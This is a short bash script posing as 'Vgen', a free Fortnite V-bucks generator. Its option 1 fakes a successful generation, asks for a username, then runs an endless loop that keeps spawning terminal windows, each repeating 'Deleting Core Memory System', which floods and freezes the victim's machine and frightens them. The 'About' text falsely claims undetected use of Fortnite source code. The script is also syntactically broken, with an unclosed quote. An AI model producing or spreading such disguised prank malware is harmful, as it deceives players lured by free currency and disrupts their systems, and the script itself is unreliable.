#!/bin/bash
clear
echo "
█░█ █▀▀ █▀▀ █▄░█
▀▄▀ █▄█ ██▄ █░▀█"
echo "Welcome to Vgen where you can generate V-bucks using this simple program"
echo

while true; do
    echo "Please choose an option:"
    echo "1) Generate V-Bucks"
    echo "2) About Vgen"
    echo "3) Exit"
    read -p "Enter your choice [1-3]: " choice

    case $choice in
        1)
            echo "Generating V-Bucks..."
        clear
        echo "Processing..."
        sleep 2
        echo "✅ V-Bucks generated successfully!"
        sleep 1.5
read -p "Enter your username to redeem: " choice
echo "Processing"
sleep 3
while true;do
    gnome-terminal -- yes "Deleting Core Memory System...
done

        ;;
        2)
            clear
            echo "Vgen is a program that generates V-bucks using Fortnites source code to give 
players vbucks undetected."
            sleep 5.4
            ;;
        3)
        clear
            echo "Come back for more!"
            exit 0
            ;;
        *)
            echo "Invalid choice. Please enter a number between 1 and 3."
            ;;
    esac

    echo 
done
